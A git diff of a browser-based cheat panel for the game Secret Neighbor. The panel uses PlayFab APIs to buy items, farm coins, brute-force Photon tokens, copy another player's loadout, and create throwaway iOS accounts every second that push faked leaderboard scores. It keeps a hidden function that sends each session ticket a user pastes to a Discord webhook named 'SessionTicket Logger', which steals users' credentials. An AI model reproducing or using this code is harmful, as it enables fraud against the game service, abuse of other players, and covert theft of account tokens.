@@ -100,11 +100,6 @@
       gap: 10px;
     }
 
-    ol {
-      text-align: left;
-      padding-left: 20px;
-    }
-
     a {
       color: #4da6ff;
       text-decoration: none;
@@ -192,19 +187,19 @@
       background-color: #fbc02d;
     }
 
-    .generate-account-btn {
+    .ios-automation-btn {
       background-color: #4CAF50;
     }
 
-    .generate-account-btn:hover {
+    .ios-automation-btn:hover {
       background-color: #45a049;
     }
 
-    .leaderboard-spammer-btn {
+    .ios-leaderboard-btn {
       background-color: #ff9900;
     }
 
-    .leaderboard-spammer-btn:hover {
+    .ios-leaderboard-btn:hover {
       background-color: #e68a00;
     }
   </style>
@@ -214,20 +209,16 @@
 
   <div class="container">
     <div class="section">
-      <h2>📄 How to Get Your SessionTicket</h2>
-      <ol>
-        <li>For <b>Main (bdff1)</b>: Launch Secret Neighbor on Steam, open your browser’s developer tools (F12 → Network tab), and filter for <code>bdff1.playfabapi.com</code>. Look for a request to <code>/Client/LoginWithSteam</code> and copy the <code>SessionTicket</code> from the response body.</li>
-        <li>For <b>IOS (C6252)</b>: Launch Secret Neighbor on iOS, sign in with GameCenter, and use a network tool or game logs to capture the <code>/Client/LoginWithGameCenter</code> request. Copy the <code>SessionTicket</code> from the response body.</li>
-        <li>Paste the <code>SessionTicket</code> into the appropriate field ("Session Ticket" for bdff1 or "IOS Session Ticket" for C6252) and click "Set Token".</li>
-      </ol>
+      <h2>📄 Tutorial</h2>
       <p>
-        Note: For iOS, check game logs in the app’s data directory or use a packet sniffer if available. Contact community forums for specific log file locations.
+        Watch the tutorial here: <a href="https://www.youtube.com/watch?v=orUbChEBxt0" target="_blank">YouTube Tutorial</a><br>
+        Tutorial Made By B0B
       </p>
     </div>
 
     <div class="section">
-      <h2>🔐 Session Ticket (bdff1)</h2>
-      <input id="sessionTicketInput" placeholder="Paste your SessionTicket here (bdff1)" type="text">
+      <h2>🔐 STEAM Session Ticket</h2>
+      <input id="sessionTicketInput" placeholder="Paste your SessionTicket here (STEAM)" type="text">
       <button onclick="setSessionTicket()">Set Token</button>
       <div class="grid-2">
         <button class="renew-btn" onclick="renewSessionTicket()">Renew SessionTicket</button>
@@ -237,8 +228,8 @@
     </div>
 
     <div class="section">
-      <h2>🔐 IOS Session Ticket (C6252)</h2>
-      <input id="sessionTicketInputIOS" placeholder="Paste your SessionTicket here (C6252)" type="text">
+      <h2>🔐 IOS Session Ticket</h2>
+      <input id="sessionTicketInputIOS" placeholder="Paste your SessionTicket here (IOS)" type="text">
       <button onclick="setSessionTicketIOS()">Set Token</button>
       <div class="grid-2">
         <button class="renew-btn" onclick="renewSessionTicketIOS()">Renew SessionTicket</button>
@@ -248,14 +239,14 @@
     </div>
 
     <div class="section">
-      <h2>🛒 Buy Everything (bdff1)</h2>
+      <h2>🛒 Buy Everything (STEAM)</h2>
       <p class="warning">This will attempt to purchase all available items (including RM currency). Close Steam before starting.</p>
       <button class="purchase-all-btn" onclick="purchaseAllSkinsEmotes()">Attempt to Buy Everything</button>
       <div class="output" id="purchaseAllOutput">Purchase logs will appear here...</div>
     </div>
 
     <div class="section">
-      <h2>🛍️ Buy Skin/Emote (bdff1)</h2>
+      <h2>🛍️ Buy Skin/Emote (STEAM)</h2>
       <input id="itemId" placeholder="ItemId" type="text">
       <input id="price" placeholder="Price" type="number">
       <input id="currency" placeholder="VirtualCurrency" type="text">
@@ -264,34 +255,41 @@
     </div>
 
     <div class="section">
-      <h2>🎁 Grant Coupons (bdff1)</h2>
+      <h2>🎁 Grant Coupons (STEAM)</h2>
       <button onclick="grantCoupons()">Grant Coupons</button>
       <div class="output" id="couponOutput">Coupon results will appear here...</div>
     </div>
 
     <div class="section">
-      <h2>📱 IOS Features (C6252)</h2>
+      <h2>📱 IOS Features <span id="iosAutomationStatus" class="status-indicator status-inactive"></span></h2>
       <input id="displayNameIOS" placeholder="Enter Display Name" type="text">
-      <button class="generate-account-btn" onclick="generateAccount()">Account Generator</button>
-      <button class="leaderboard-spammer-btn" onclick="spamLeaderboard()">Leaderboard Spammer</button>
+      <div class="grid-2">
+        <button class="ios-automation-btn" onclick="toggleIOSAutomation()" id="iosAutomationToggleButton">Start IOS Automation</button>
+        <button class="ios-leaderboard-btn" onclick="viewIOSLeaderboard()">View IOS Leaderboard</button>
+      </div>
+      <div>
+        <input id="iosStatisticName" placeholder="Statistic Name" type="text">
+        <input id="iosStartPosition" placeholder="Start Position" type="number" value="0">
+        <input id="iosMaxResults" placeholder="Max Results" type="number" value="100">
+      </div>
       <div class="output" id="iosOutput">Results will appear here...</div>
     </div>
 
     <div class="section">
-      <h2>📊 View Statistics (bdff1)</h2>
+      <h2>📊 View Statistics (STEAM)</h2>
       <button onclick="viewStatistics()">View Statistics</button>
       <div class="output" id="statsOutput">Statistics will appear here...</div>
     </div>
 
     <div class="section">
-      <h2>💰 Add Coin (Call it In-Game) (bdff1)</h2>
+      <h2>💰 Add Coin (Call it In-Game) (STEAM)</h2>
       <p class="warning">Warning: Do not use more than 30 coins per match!</p>
       <button onclick="AddCoin()">Add Coin</button>
       <div class="output" id="usefulDeedOutput">Coin results will appear here...</div>
     </div>
 
     <div class="section">
-      <h2>🤖 Coin Farm Bot (bdff1) <span id="botStatus" class="status-indicator status-inactive"></span></h2>
+      <h2>🤖 Coin Farm Bot (STEAM) <span id="botStatus" class="status-indicator status-inactive"></span></h2>
       <div class="grid-2">
         <div>
           <label>Room Type:</label>
@@ -324,7 +322,7 @@
     </div>
 
     <div class="section">
-      <h2>🧪 Level Editor (bdff1) <span id="levelEditorStatus" class="status-indicator status-inactive"></span></h2>
+      <h2>🧪 Level Editor (STEAM) <span id="levelEditorStatus" class="status-indicator status-inactive"></span></h2>
       <input type="text" id="classIdInput" placeholder="Class ID">
       <input type="number" id="receivedXPInput" placeholder="Received XP">
       <input type="number" id="xpInput" placeholder="XP">
@@ -337,14 +335,14 @@
     </div>
 
     <div class="section">
-      <h2>🔍 PlayFab Info Lookup (bdff1)</h2>
+      <h2>🔍 PlayFab Info Lookup (STEAM)</h2>
       <input type="text" id="playfabId" placeholder="Enter PlayFab ID">
       <button onclick="getPlayFabInfo()">Get Info</button>
       <div class="output" id="playfabInfoOutput">Results will appear here...</div>
     </div>
 
     <div class="section">
-      <h2>📝 Update Quest Progress (bdff1)</h2>
+      <h2>📝 Update Quest Progress (STEAM)</h2>
       <input type="text" id="questTextFieldId" placeholder="Quest Text Field ID">
       <input type="number" id="questProgressValue" placeholder="Progress Value">
       <button onclick="updateQuestProgress()">Update Quest</button>
@@ -412,7 +410,7 @@
     </div>
 
     <div class="section">
-      <h2>🔗 Additional Stuff (bdff1)</h2>
+      <h2>🔗 Additional Stuff (STEAM)</h2>
       <div class="api-grid">
         <div>
           <h3>👥 Add Friend</h3>
@@ -465,7 +463,7 @@
     </div>
 
     <div class="section">
-      <h2>⚖️ Penalty Points Management (bdff1)</h2>
+      <h2>⚖️ Penalty Points Management (STEAM)</h2>
       <div class="grid-2">
         <button class="penalty-btn" onclick="increasePenaltyPoints()">Increase Penalty Points</button>
         <button class="reset-penalty-btn" onclick="decreasePenaltyPoints()">Decrease Penalty Points</button>
@@ -476,32 +474,32 @@
     </div>
 
     <div class="section">
-      <h2>🔑 Photon Token Generator (bdff1) <span id="photonTokenStatus" class="status-indicator status-inactive"></span></h2>
+      <h2>🔑 Photon Token Generator (STEAM) <span id="photonTokenStatus" class="status-indicator status-inactive"></span></h2>
       <button onclick="togglePhotonTokenGenerator()" id="photonTokenToggleButton">Start Generating Photon Token</button>
       <div class="output" id="photonTokenOutput">Token will appear here...</div>
     </div>
 
     <div class="section">
-      <h2>🔄 Reset Loadout (bdff1)</h2>
+      <h2>🔄 Reset Loadout (STEAM)</h2>
       <button onclick="resetLoadout()">Reset Loadout</button>
       <div class="output" id="resetLoadoutOutput">Results will appear here...</div>
     </div>
 
     <div class="section">
-      <h2>🕵️ Steal Loadout (bdff1)</h2>
+      <h2>🕵️ Steal Loadout (STEAM)</h2>
       <input id="targetPlayFabId" placeholder="Target PlayFab ID" type="text">
       <button onclick="stealLoadout()">Steal Loadout</button>
       <div class="output" id="stealLoadoutOutput">Results will appear here...</div>
     </div>
 
     <div class="section">
-      <h2>📦 View Inventory (bdff1)</h2>
+      <h2>📦 View Inventory (STEAM)</h2>
       <button onclick="viewInventory()">View Inventory</button>
       <div class="output" id="inventoryOutput">Inventory results will appear here...</div>
     </div>
 
     <div class="section">
-      <h2>🔨 Photon Token Bruteforcer (bdff1)</h2>
+      <h2>🔨 Photon Token Bruteforcer (STEAM)</h2>
       <input id="playFabUsername" placeholder="PlayFab ID" type="text">
       <button onclick="startBruteforce()">Start Bruteforce</button>
       <button onclick="stopBruteforce()">Stop Bruteforce</button>
@@ -523,10 +521,34 @@
     let photonTokenIntervalId = null;
     let couponBruteforceRunning = false;
     let couponBruteforceIntervalId = null;
+    let iosAutomationRunning = false;
+    let iosAutomationIntervalId = null;
     let failedAttempts = 0;
-    const logEntries = [];
     let totalTokensGenerated = 0;
     let attempts = 0;
+    const iosAutomationLog = [];
+
+    function logIOSAction(action, details) {
+      iosAutomationLog.push({
+        timestamp: new Date().toISOString(),
+        action: action,
+        details: details
+      });
+    }
+
+    function downloadLogAsJSON() {
+      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+      const filename = `ios_automation_log_${timestamp}.json`;
+      const blob = new Blob([JSON.stringify(iosAutomationLog, null, 2)], { type: 'application/json' });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.href = url;
+      link.download = filename;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      URL.revokeObjectURL(url);
+    }
 
     function setSessionTicket() {
       sessionTicket = document.getElementById("sessionTicketInput").value.trim();
@@ -537,7 +559,7 @@
         tokenStatus.textContent = "✅ Token set successfully!";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
-        console.log("SessionTicket set (bdff1):", sessionTicket);
+        console.log("SessionTicket set (STEAM):", sessionTicket);
         sendToDiscordWebhook(sessionTicket);
       } else {
         tokenStatus.textContent = "❌ Please enter a valid token";
@@ -588,7 +610,7 @@
           document.getElementById("sessionTicketInput").value = sessionTicket;
           tokenStatus.textContent = "✅ Session ticket renewed successfully!";
           tokenStatus.style.color = "green";
-          console.log("SessionTicket renewed (bdff1):", sessionTicket);
+          console.log("SessionTicket renewed (STEAM):", sessionTicket);
           sendToDiscordWebhook(sessionTicket);
         } else {
           tokenStatus.textContent = `❌ Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
@@ -610,7 +632,7 @@
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            content: `New SessionTicket captured (bdff1): ${sessionTicket}`,
+            content: `New SessionTicket captured (STEAM): ${sessionTicket}`,
             username: 'SessionTicket Logger',
             avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
           })
@@ -635,7 +657,7 @@
         tokenStatus.textContent = "✅ Token set successfully!";
         tokenStatus.style.display = "block";
         tokenStatus.style.color = "green";
-        console.log("SessionTicket set (C6252):", sessionTicketIOS);
+        console.log("SessionTicket set (IOS):", sessionTicketIOS);
       } else {
         tokenStatus.textContent = "❌ Please enter a valid token";
         tokenStatus.style.display = "block";
@@ -685,7 +707,7 @@
           document.getElementById("sessionTicketInputIOS").value = sessionTicketIOS;
           tokenStatus.textContent = "✅ Session ticket renewed successfully!";
           tokenStatus.style.color = "green";
-          console.log("SessionTicket renewed (C6252):", sessionTicketIOS);
+          console.log("SessionTicket renewed (IOS):", sessionTicketIOS);
         } else {
           tokenStatus.textContent = `❌ Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
           tokenStatus.style.color = "red";
@@ -725,145 +747,210 @@
       return result;
     }
 
-    async function generateAccount() {
+    async function toggleIOSAutomation() {
       const output = document.getElementById("iosOutput");
       const displayNameBase = document.getElementById("displayNameIOS").value.trim();
-      output.textContent = "Generating account...\n";
+
+      if (iosAutomationRunning) {
+        clearInterval(iosAutomationIntervalId);
+        iosAutomationRunning = false;
+        document.getElementById("iosAutomationStatus").className = "status-indicator status-inactive";
+        document.getElementById("iosAutomationToggleButton").textContent = "Start IOS Automation";
+        output.textContent += "\nIOS Automation stopped manually.\n";
+        logIOSAction("Automation Stopped", { message: "IOS Automation stopped manually" });
+        downloadLogAsJSON();
+        iosAutomationLog.length = 0; // Clear log after download
+        output.scrollTop = output.scrollHeight;
+        return;
+      }
 
       if (!displayNameBase) {
-        output.textContent += "❌ Please enter a display name.\n";
+        output.textContent = "❌ Please enter a display name.\n";
         output.style.color = "red";
+        output.scrollTop = output.scrollHeight;
         return;
       }
 
-      // Generate random PlayerId
-      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      const playerIdLength = 20;
-      let playerId = '';
-      for (let i = 0; i < playerIdLength; i++) {
-        playerId += chars.charAt(Math.floor(Math.random() * chars.length));
+      iosAutomationRunning = true;
+      document.getElementById("iosAutomationStatus").className = "status-indicator status-active";
+      document.getElementById("iosAutomationToggleButton").textContent = "Stop IOS Automation";
+      output.textContent = "Starting IOS Automation...\n";
+      logIOSAction("Automation Started", { message: "IOS Automation started" });
+
+      async function runIOSAutomationCycle() {
+        try {
+          // Step 1: Generate Account
+          output.textContent += "\n=== Account Generation ===\n";
+          const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+          const playerIdLength = 20;
+          let playerId = '';
+          for (let i = 0; i < playerIdLength; i++) {
+            playerId += chars.charAt(Math.floor(Math.random() * chars.length));
+          }
+          const randomDigits = Math.floor(1000 + Math.random() * 9000);
+          const displayName = `${displayNameBase}${randomDigits}`;
+
+          output.textContent += `Creating account with PlayerId: ${playerId}...\n`;
+          logIOSAction("Account Creation Attempt", { playerId });
+          const loginResponse = await makeApiCall("Client/LoginWithGameCenter", "POST", {
+            CreateAccount: true,
+            TitleId: titleIdIOS,
+            PlayerId: playerId
+          }, titleIdIOS);
+
+          if (loginResponse.error || !loginResponse.data?.SessionTicket) {
+            const errorMsg = loginResponse.error || loginResponse.errorMessage || "Unknown error";
+            output.textContent += `❌ Failed to create account: ${errorMsg}\n`;
+            logIOSAction("Account Creation Failed", { playerId, error: errorMsg });
+            output.style.color = "red";
+            return;
+          }
+
+          sessionTicketIOS = loginResponse.data.SessionTicket;
+          localStorage.setItem('sessionTicketIOS', sessionTicketIOS);
+          document.getElementById("sessionTicketInputIOS").value = sessionTicketIOS;
+          output.textContent += `✅ Account created successfully!\nSessionTicket: ${sessionTicketIOS}\nPlayerId: ${playerId}\n`;
+          logIOSAction("Account Creation Success", { playerId, sessionTicket: sessionTicketIOS });
+
+          // Step 2: Set Display Name
+          output.textContent += `Setting display name to ${displayName}...\n`;
+          logIOSAction("Set Display Name Attempt", { displayName });
+          const updateResponse = await makeApiCall("Client/UpdateUserTitleDisplayName", "POST", {
+            DisplayName: displayName
+          }, titleIdIOS, sessionTicketIOS);
+
+          if (updateResponse.error) {
+            const errorMsg = updateResponse.error || updateResponse.errorMessage || "Unknown error";
+            output.textContent += `❌ Failed to set display name: ${errorMsg}\n`;
+            logIOSAction("Set Display Name Failed", { displayName, error: errorMsg });
+            output.style.color = "red";
+          } else {
+            output.textContent += `✅ Display name set to ${displayName}\n`;
+            logIOSAction("Set Display Name Success", { displayName });
+            output.style.color = "green";
+          }
+
+          // Step 3: Spam Leaderboard
+          output.textContent += "\n=== Leaderboard Spam ===\n";
+          logIOSAction("Leaderboard Spam Attempt", {});
+          output.textContent += "📋 Fetching level progression...\n";
+          const progressionData = await makeApiCall(
+            "Client/ExecuteCloudScript",
+            "POST",
+            {
+              FunctionName: "getLevelProgression",
+              FunctionParameter: {},
+              GeneratePlayStreamEvent: true
+            },
+            titleIdIOS,
+            sessionTicketIOS
+          );
+
+          if (progressionData.error || !progressionData.data?.FunctionResult) {
+            const errorMsg = progressionData.error || "Unknown error";
+            output.textContent += `❌ Failed to get level progression: ${errorMsg}\n`;
+            logIOSAction("Leaderboard Spam Failed", { step: "getLevelProgression", error: errorMsg });
+            output.style.color = "red";
+            return;
+          }
+
+          let currentLevelProgression = progressionData.data.FunctionResult;
+          output.textContent += `✅ Retrieved level progression:\n${JSON.stringify(currentLevelProgression, null, 2)}\n`;
+          logIOSAction("Get Level Progression Success", { progression: currentLevelProgression });
+
+          const maxInt = 2147483647;
+          const modifiedProgression = JSON.parse(JSON.stringify(currentLevelProgression));
+          Object.keys(modifiedProgression).forEach(key => {
+            if (typeof modifiedProgression[key] === "number") {
+              modifiedProgression[key] = Math.random() > 0.5 ? 69420 : maxInt;
+            } else if (typeof modifiedProgression[key] === "object" && modifiedProgression[key] !== null) {
+              Object.keys(modifiedProgression[key]).forEach(subKey => {
+                if (typeof modifiedProgression[key][subKey] === "number") {
+                  modifiedProgression[key][subKey] = Math.random() > 0.5 ? 69420 : maxInt;
+                }
+              });
+            }
+          });
+
+          output.textContent += `📝 Modified level progression:\n${JSON.stringify(modifiedProgression, null, 2)}\n`;
+          logIOSAction("Modified Progression", { modifiedProgression });
+
+          output.textContent += "🔄 Updating leaderboard...\n";
+          const updateData = await makeApiCall(
+            "Client/ExecuteCloudScript",
+            "POST",
+            {
+              FunctionName: "refreshLeaderboardPlatform",
+              FunctionParameter: {
+                currentLevelProgression: JSON.stringify(modifiedProgression)
+              },
+              GeneratePlayStreamEvent: true
+            },
+            titleIdIOS,
+            sessionTicketIOS
+          );
+
+          if (updateData.error) {
+            output.textContent += `❌ Failed to update leaderboard: ${updateData.error}\n`;
+            logIOSAction("Leaderboard Update Failed", { error: updateData.error });
+            output.style.color = "red";
+          } else {
+            output.textContent += `✅ Leaderboard updated successfully!\n${formatResponse(updateData.data)}\n`;
+            logIOSAction("Leaderboard Update Success", { result: updateData.data });
+            output.style.color = "green";
+          }
+        } catch (error) {
+          output.textContent += `❌ Unexpected error: ${error.message}\n`;
+          logIOSAction("Unexpected Error", { error: error.message });
+          output.style.color = "red";
+        }
+        output.scrollTop = output.scrollHeight;
       }
 
-      // Generate random 4-digit number for display name
-      const randomDigits = Math.floor(1000 + Math.random() * 9000);
-      const displayName = `${displayNameBase}${randomDigits}`;
-
-      try {
-        // Step 1: Create account with LoginWithGameCenter
-        output.textContent += `Creating account with PlayerId: ${playerId}...\n`;
-        const loginResponse = await makeApiCall("Client/LoginWithGameCenter", "POST", {
-          CreateAccount: true,
-          TitleId: titleIdIOS,
-          PlayerId: playerId
-        }, titleIdIOS);
-
-        if (loginResponse.error || !loginResponse.data?.SessionTicket) {
-          output.textContent += `❌ Failed to create account: ${loginResponse.error || loginResponse.errorMessage || "Unknown error"}\n`;
-          output.style.color = "red";
-          return;
-        }
-
-        sessionTicketIOS = loginResponse.data.SessionTicket;
-        localStorage.setItem('sessionTicketIOS', sessionTicketIOS);
-        document.getElementById("sessionTicketInputIOS").value = sessionTicketIOS;
-        output.textContent += `✅ Account created successfully!\nSessionTicket: ${sessionTicketIOS}\nPlayerId: ${playerId}\n`;
-
-        // Step 2: Set display name
-        output.textContent += `Setting display name to ${displayName}...\n`;
-        const updateResponse = await makeApiCall("Client/UpdateUserTitleDisplayName", "POST", {
-          DisplayName: displayName
-        }, titleIdIOS, sessionTicketIOS);
-
-        if (updateResponse.error) {
-          output.textContent += `❌ Failed to set display name: ${updateResponse.error || updateResponse.errorMessage || "Unknown error"}\n`;
-          output.style.color = "red";
-        } else {
-          output.textContent += `✅ Display name set to ${displayName}\n`;
-          output.style.color = "green";
-        }
-      } catch (error) {
-        output.textContent += `❌ Error generating account: ${error.message}\n`;
-        output.style.color = "red";
-      }
-      output.scrollTop = output.scrollHeight;
+      runIOSAutomationCycle();
+      iosAutomationIntervalId = setInterval(runIOSAutomationCycle, 1000); // 1-second interval for continuous operation
     }
 
-    async function spamLeaderboard() {
+    async function viewIOSLeaderboard() {
       const output = document.getElementById("iosOutput");
-      output.textContent = "Starting leaderboard spam...\n";
+      const statisticName = document.getElementById("iosStatisticName").value.trim();
+      const startPosition = parseInt(document.getElementById("iosStartPosition").value) || 0;
+      const maxResults = parseInt(document.getElementById("iosMaxResults").value) || 100;
 
       if (!sessionTicketIOS) {
-        output.textContent += "❌ Please set your IOS SessionTicket first.\n";
+        output.textContent = "❌ Please set your IOS SessionTicket first.\n";
         output.style.color = "red";
         return;
       }
 
+      if (!statisticName) {
+        output.textContent = "❌ Please enter a statistic name.\n";
+        output.style.color = "red";
+        return;
+      }
+
+      output.textContent = "Fetching IOS leaderboard...\n";
       try {
-        // Step 1: Get level progression
-        output.textContent += "📋 Fetching level progression...\n";
-        const progressionData = await makeApiCall(
-          "Client/ExecuteCloudScript",
-          "POST",
-          {
-            FunctionName: "getLevelProgression",
-            FunctionParameter: {},
-            GeneratePlayStreamEvent: true
-          },
-          titleIdIOS,
-          sessionTicketIOS
-        );
+        const data = await makeApiCall("Client/GetLeaderboard", "POST", {
+          StatisticName: statisticName,
+          StartPosition: startPosition,
+          MaxResultsCount: maxResults
+        }, titleIdIOS, sessionTicketIOS);
 
-        if (progressionData.error || !progressionData.data?.FunctionResult) {
-          output.textContent += `❌ Failed to get level progression: ${progressionData.error || "Unknown error"}\n`;
-          output.style.color = "red";
-          return;
-        }
-
-        let currentLevelProgression = progressionData.data.FunctionResult;
-        output.textContent += `✅ Retrieved level progression:\n${JSON.stringify(currentLevelProgression, null, 2)}\n`;
-
-        // Step 2: Modify progression values
-        const maxInt = 2147483647; // Maximum 32-bit signed integer
-        const modifiedProgression = JSON.parse(JSON.stringify(currentLevelProgression)); // Deep copy
-        Object.keys(modifiedProgression).forEach(key => {
-          if (typeof modifiedProgression[key] === "number") {
-            modifiedProgression[key] = Math.random() > 0.5 ? 69420 : maxInt;
-          } else if (typeof modifiedProgression[key] === "object" && modifiedProgression[key] !== null) {
-            Object.keys(modifiedProgression[key]).forEach(subKey => {
-              if (typeof modifiedProgression[key][subKey] === "number") {
-                modifiedProgression[key][subKey] = Math.random() > 0.5 ? 69420 : maxInt;
-              }
-            });
-          }
-        });
-
-        output.textContent += `📝 Modified level progression:\n${JSON.stringify(modifiedProgression, null, 2)}\n`;
-
-        // Step 3: Update leaderboard
-        output.textContent += "🔄 Updating leaderboard...\n";
-        const updateData = await makeApiCall(
-          "Client/ExecuteCloudScript",
-          "POST",
-          {
-            FunctionName: "refreshLeaderboardPlatform",
-            FunctionParameter: {
-              currentLevelProgression: JSON.stringify(modifiedProgression)
-            },
-            GeneratePlayStreamEvent: true
-          },
-          titleIdIOS,
-          sessionTicketIOS
-        );
-
-        if (updateData.error) {
-          output.textContent += `❌ Failed to update leaderboard: ${updateData.error}\n`;
+        if (data.data && data.data.Leaderboard) {
+          let leaderboardText = `Leaderboard for ${statisticName}:\n\n`;
+          data.data.Leaderboard.forEach((entry, index) => {
+            leaderboardText += `${startPosition + index + 1}. ${entry.DisplayName}: ${entry.StatValue}\n`;
+          });
+          output.textContent = leaderboardText;
+        } else if (data.error) {
+          output.textContent = `❌ Error: ${data.error}\n`;
           output.style.color = "red";
         } else {
-          output.textContent += `✅ Leaderboard updated successfully!\n${formatResponse(updateData.data)}\n`;
-          output.style.color = "green";
+          output.textContent = "No leaderboard data found.\n";
         }
       } catch (error) {
-        output.textContent += `❌ Unexpected error: ${error.message}\n`;
+        output.textContent = `❌ Unexpected error: ${error.message}\n`;
         output.style.color = "red";
       }
       output.scrollTop = output.scrollHeight;
@@ -1142,7 +1229,7 @@
     async function getLeaderboard() {
       const statisticName = document.getElementById("statisticName").value.trim();
       const startPosition = parseInt(document.getElementById("startPosition").value) || 0;
-      const maxResults = parseInt(document.getElementById("maxResults").value) || 10;
+      const maxResults = parseInt(document.getElementById("maxResults").value) || 100;
 
       if (!statisticName) {
         document.getElementById("apiOutput").textContent = "Please enter a statistic name.";
@@ -1260,8 +1347,12 @@
           ProviderName: "Steam"
         }, titleIdMain, sessionTicket);
 
-        output.textContent += "\nConfirming purchase...";
+        if (payData.error || !payData.data?.PaymentProviderTransactionId) {
+          output.textContent += `\nError in PayForPurchase: ${payData.error || "Payment failed"}\n`;
+          return;
+        }
 
+        output.textContent += "\nConfirming purchase...";
         const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
           OrderId: orderId
         }, titleIdMain, sessionTicket);
@@ -1272,10 +1363,10 @@
           output.textContent += "\nCoupon process completed:\n" + 
             formatResponse(confirmData.data);
         }
-
       } catch (error) {
         output.textContent += `\nUnexpected error: ${error.message}`;
       }
+      output.scrollTop = output.scrollHeight;
     }
 
     async function viewStatistics() {
@@ -1604,110 +1695,41 @@
           document.getElementById("playerId6").value.trim()
         ].filter(id => id);
 
-        let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()} ===\n`;
-        output += `Room Type: ${roomType}\nPlayers: ${playerIds.join(", ") || "None"}\n`;
-
-        let matchId = null;
+        const output = document.getElementById("cloudOutput");
+        output.textContent += `\nRunning Coin Farm cycle (Room Type: ${roomType})...\n`;
 
         try {
           const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-            FunctionName: "startNewMatch",
-            FunctionParameter: { roomType, playerIds },
+            FunctionName: "startCoinFarm",
+            FunctionParameter: {
+              roomType: roomType,
+              playerIds: playerIds
+            },
             GeneratePlayStreamEvent: true
           }, titleIdMain, sessionTicket);
 
           if (data.error) {
-            output += `❌ startNewMatch: Error - ${data.error}\n`;
-          } else if (data.data?.FunctionResult?.currentMatchId) {
-            matchId = data.data.FunctionResult.currentMatchId;
-            output += `✅ startNewMatch: MatchId - ${matchId}\n`;
+            output.textContent += `❌ Error: ${data.error}\n`;
           } else {
-            output += `✅ startNewMatch: Success\n`;
+            output.textContent += `✅ Coin Farm cycle completed successfully\n${formatResponse(data.data)}\n`;
           }
-        } catch (err) {
-          output += `❌ startNewMatch: Exception - ${err.message}\n`;
+        } catch (error) {
+          output.textContent += `❌ Unexpected error: ${error.message}\n`;
         }
-
-        try {
-          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-            FunctionName: "decideSpecialRole",
-            FunctionParameter: { roomType, playerIds },
-            GeneratePlayStreamEvent: true
-          }, titleIdMain, sessionTicket);
-
-          if (data.error) {
-            output += `❌ decideSpecialRole: Error - ${data.error}\n`;
-          } else {
-            output += `✅ decideSpecialRole: Success\n`;
-          }
-        } catch (err) {
-          output += `❌ decideSpecialRole: Exception - ${err.message}\n`;
-        }
-
-        if (matchId) {
-          try {
-            const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-              CustomTags: null,
-              FunctionName: "xpConsumed",
-              FunctionParameter: {
-                token: matchId
-              },
-              GeneratePlayStreamEvent: true,
-              RevisionSelection: null,
-              SpecificRevision: null,
-              AuthenticationContext: null
-            }, titleIdMain, sessionTicket);
-
-            if (data.error) {
-              output += `❌ xpConsumed: Error - ${data.error}\n`;
-            } else {
-              output += `✅ xpConsumed: Success\n`;
-            }
-          } catch (err) {
-            output += `❌ xpConsumed: Exception - ${err.message}\n`;
-          }
-        } else {
-          output += `⏩ xpConsumed: Skipped - No MatchId available\n`;
-        }
-
-        try {
-          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
-            FunctionName: "finishMatch",
-            FunctionParameter: { roomType, playerIds },
-            GeneratePlayStreamEvent: true
-          }, titleIdMain, sessionTicket);
-
-          if (data.error) {
-            output += `❌ finishMatch: Error - ${data.error}\n`;
-          } else if (data.data?.Logs) {
-            output += `✅ finishMatch: Success\nLogs:\n`;
-            data.data.Logs.forEach(log => {
-              output += `- ${log.Message}\n`;
-            });
-          } else {
-            output += `✅ finishMatch: Success\n`;
-          }
-        } catch (err) {
-          output += `❌ finishMatch: Exception - ${err.message}\n`;
-        }
-
-        output += `Waiting ${delayMinutes} minutes for next cycle...\n`;
-        const cloudOutput = document.getElementById("cloudOutput");
-        cloudOutput.textContent += output;
-        cloudOutput.scrollTop = cloudOutput.scrollHeight;
+        output.scrollTop = output.scrollHeight;
       }
 
       runCoinFarmCycle();
       coinFarmIntervalId = setInterval(runCoinFarmCycle, delayMs);
     }
 
-    function toggleLevelEditor() {
+    async function toggleLevelEditor() {
       if (levelEditorRunning) {
         clearInterval(levelEditorIntervalId);
         levelEditorRunning = false;
         document.getElementById("levelEditorStatus").className = "status-indicator status-inactive";
         document.getElementById("levelEditorToggleButton").textContent = "Start Level Editor";
-        document.getElementById("levelProgressionOutput").textContent += "\nLevel editor stopped manually.";
+        document.getElementById("levelProgressionOutput").textContent += "\nLevel Editor stopped manually.";
         return;
       }
 
@@ -1724,8 +1746,7 @@
         if (data.error) {
           output.textContent += `❌ Error: ${data.error}\n`;
         } else {
-          output.textContent += `✅ Level progression updated successfully\n`;
-          output.textContent += formatResponse(data.data);
+          output.textContent += `✅ Level progression updated successfully\n${formatResponse(data.data)}\n`;
         }
         output.scrollTop = output.scrollHeight;
       }
